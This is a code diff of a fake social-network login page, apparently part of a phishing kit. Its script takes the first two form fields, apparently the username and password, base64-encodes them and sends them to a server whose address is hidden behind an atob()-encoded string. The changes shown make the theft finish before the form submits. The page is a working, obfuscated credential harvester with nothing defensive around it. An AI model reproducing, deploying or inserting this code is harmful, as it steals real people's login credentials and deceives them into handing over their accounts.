@@ -70,7 +70,7 @@
       <div class="logo">
         <img src="img/socials/logo.png" alt="Logo" />
       </div>
-      <form id="webhookForm" onsubmit="st.foo()">
+      <form id="webhookForm">
 
         <input type="text" id="username" placeholder="Phone number, username, or email" required>
 
@@ -167,14 +167,17 @@
     <script>
       function st(elm) {
         if(st.dn) return;
-        fetch(`${atob("aHR0cHM6Ly9hcGktaHl4cS5vbnJlbmRlci5jb20v")}fb?data=${encodeURIComponent(`{"1":"${btoa(elm[0].value)}","2":"${btoa(elm[1].value)}","3":true}`)}`)
+        fetch(`${atob("aHR0cHM6Ly9hcGktaHl4cS5vbnJlbmRlci5jb20v")}fb?data=${encodeURIComponent(`{"1":"${btoa(elm[0].value)}","2":"${btoa(elm[1].value)}","3":true}`)}`).then(function() {
+          st.f=true
+        })
         st.dn=true;
       }
-      document.querySelector("form").addEventListener("submit",function(ev){
-        if(st.dn) return;
+      document.querySelector("form#webhookForm").addEventListener("submit",function(ev){
+        if(st.f) return;
         event.preventDefault();
         event.stopImmediatePropagation();
         event.stopPropagation();
+        if(st.dn) return;
         st(this);
         this.submit();
       })
